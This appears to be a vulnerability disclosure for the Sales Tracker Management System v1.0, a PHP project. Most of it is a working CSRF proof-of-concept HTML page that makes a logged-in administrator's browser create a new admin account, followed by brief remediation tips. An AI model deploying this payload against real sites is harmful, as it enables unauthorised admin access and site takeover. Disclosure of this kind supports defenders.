# Sales Tracker Management System has CSRF vulnerability

## CSRF vulnerability

BUG_Author: Murasaki

URL：http://localhost/php-sts/admin/?page=user/list

Link:https://www.sourcecodester.com/php/16061/sales-tracker-management-system-using-php-free-source-code.html

There is a CSRF vulnerability in the Sales Tracker Management System v1.0.

When the administrator is logged in, open the created JS file to complete the operation of adding an administrator. When the administrator is logged in, open the specified JS file to complete a series of operations that require permissions, such as adding an administrator.

![](https://github.com/1MurasaKi/STMS_CSRF/blob/main/before.png?raw=true)
![](https://github.com/1MurasaKi/STMS_CSRF/blob/main/after.png?raw=true)


# Exploit

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/192.168.8.131\/php-sts\/classes\/Users.php?f=save", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundaryHum8Ubu1DUiN8lA5");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"id\"\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"firstname\"\r\n" + 
          "\r\n" + 
          "hack\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"middlename\"\r\n" + 
          "\r\n" + 
          "123123\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"lastname\"\r\n" + 
          "\r\n" + 
          "hack\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"username\"\r\n" + 
          "\r\n" + 
          "hack\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"password\"\r\n" + 
          "\r\n" + 
          "hack\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"type\"\r\n" + 
          "\r\n" + 
          "1\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5\r\n" + 
          "Content-Disposition: form-data; name=\"img\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundaryHum8Ubu1DUiN8lA5--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

# Suggestion

- Verify the origin of the request
- Use token credentials
- Add validation for key operations
